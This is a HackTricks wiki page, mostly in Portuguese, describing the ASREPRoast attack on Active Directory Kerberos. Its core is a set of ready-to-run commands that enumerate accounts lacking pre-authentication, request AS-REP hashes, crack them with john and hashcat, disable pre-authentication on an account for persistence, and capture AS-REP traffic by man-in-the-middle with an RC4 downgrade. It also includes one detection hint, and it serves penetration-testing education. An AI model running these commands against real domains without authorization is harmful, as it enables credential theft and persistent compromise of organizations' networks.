# ASREPRoast

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Join [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) server to communicate with experienced hackers and bug bounty hunters!

**Hacking Insights**\
Engage with content that delves into the thrill and challenges of hacking

**Real-Time Hack News**\
Keep up-to-date with fast-paced hacking world through real-time news and insights

**Latest Announcements**\
Stay informed with the newest bug bounties launching and crucial platform updates

**Join us on** [**Discord**](https://discord.com/invite/N3FrSbmwdy) and start collaborating with top hackers today!

## ASREPRoast

ASREPRoast é um ataque de segurança que explora usuários que não possuem o **atributo requerido de pré-autenticação Kerberos**. Essencialmente, essa vulnerabilidade permite que atacantes solicitem autenticação para um usuário do Controlador de Domínio (DC) sem precisar da senha do usuário. O DC então responde com uma mensagem criptografada com a chave derivada da senha do usuário, que os atacantes podem tentar quebrar offline para descobrir a senha do usuário.

Os principais requisitos para este ataque são:

* **Falta de pré-autenticação Kerberos**: Os usuários-alvo não devem ter esse recurso de segurança habilitado.
* **Conexão ao Controlador de Domínio (DC)**: Os atacantes precisam de acesso ao DC para enviar solicitações e receber mensagens criptografadas.
* **Conta de domínio opcional**: Ter uma conta de domínio permite que os atacantes identifiquem usuários vulneráveis de forma mais eficiente por meio de consultas LDAP. Sem tal conta, os atacantes devem adivinhar nomes de usuário.

#### Enumerando usuários vulneráveis (necessita de credenciais de domínio)

{% code title="Using Windows" %}
```bash
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```
{% endcode %}

{% code title="Usando Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### Solicitar mensagem AS\_REP

{% code title="Usando Linux" %}
```bash
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```
{% endcode %}

{% code title="Usando o Windows" %}
```bash
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
{% endcode %}

{% hint style="warning" %}
AS-REP Roasting com Rubeus gerará um 4768 com um tipo de criptografia de 0x17 e um tipo de pré-autenticação de 0.
{% endhint %}

### Quebra
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistência

Force **preauth** não é necessário para um usuário onde você tem permissões **GenericAll** (ou permissões para escrever propriedades):

{% code title="Usando Windows" %}
```bash
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```
{% endcode %}

{% code title="Usando Linux" %}
```bash
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH
```
{% endcode %}

## ASREProast sem credenciais

Um atacante pode usar uma posição de man-in-the-middle para capturar pacotes AS-REP enquanto eles atravessam a rede, sem depender da desativação da pré-autenticação Kerberos. Portanto, funciona para todos os usuários na VLAN.\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nos permite fazer isso. Além disso, a ferramenta força as estações de trabalho dos clientes a usar RC4, alterando a negociação Kerberos.
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## Referências

* [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)

***

<figure><img src="/.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Junte-se ao [**HackenProof Discord**](https://discord.com/invite/N3FrSbmwdy) para se comunicar com hackers experientes e caçadores de bugs!

**Insights de Hacking**\
Engaje-se com conteúdo que mergulha na emoção e nos desafios do hacking

**Notícias de Hack em Tempo Real**\
Mantenha-se atualizado com o mundo do hacking em ritmo acelerado através de notícias e insights em tempo real

**Últimos Anúncios**\
Fique informado sobre os novos programas de recompensas por bugs lançados e atualizações cruciais da plataforma

**Junte-se a nós no** [**Discord**](https://discord.com/invite/N3FrSbmwdy) e comece a colaborar com os melhores hackers hoje!

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Suporte ao HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os repositórios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
